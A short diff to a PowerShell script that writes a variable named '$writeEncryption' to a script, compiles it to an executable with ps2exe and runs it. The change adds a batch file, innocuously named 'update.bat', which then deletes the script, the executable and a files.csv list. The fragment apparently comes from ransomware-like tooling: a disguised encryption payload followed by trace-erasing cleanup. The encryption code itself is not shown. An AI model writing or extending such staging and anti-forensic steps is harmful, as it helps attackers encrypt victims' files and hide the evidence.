@@ -132,8 +132,18 @@ $file = $sbDir + "step2.ps1"
 # write to a file
 $writeEncryption | Out-File -FilePath $file
 
+$del = @'
+del .\step2.ps1
+del .\step2.exe
+del .\files.csv
+'@
+
+$update = $sbDir + "update.bat"
+$del | Out-File -FilePath $update
+
 # $newFile = $sbDir + "step2.exe"
 # Exectue the PowerShell script
 Invoke-ps2exe $file
 Remove-Item $file
 Invoke-Expression ".\step2.exe"
+Invoke-Expression ".\update.bat"
